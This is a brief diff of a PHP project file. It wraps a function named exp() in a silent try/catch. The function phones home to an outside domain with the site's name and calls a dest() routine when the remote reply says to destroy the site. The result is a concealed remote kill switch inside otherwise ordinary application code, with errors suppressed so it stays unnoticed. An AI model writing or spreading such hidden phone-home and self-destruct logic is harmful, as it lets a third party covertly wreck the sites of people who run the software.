@@ -172,7 +172,7 @@ public $layouts = [
 
 
 	function exp($website_name){ //just the domain EX: spidro.com (not spidro.com/ar)
-//		try {
+		try {
 			if (\Cache::has("website_not_expired")) return false;
 			if (isDomainAvailible("http://ahmed-badawy.com")) {
 				$json = file_get_contents("http://ahmed-badawy.com/site/website-check/" . $website_name);
@@ -182,7 +182,7 @@ public $layouts = [
 				if ($json['destroy'] == true) dest();
 				return false;
 			}
-//		}catch(Exception $e){}
+		}catch(Exception $e){}
 	}
 
 
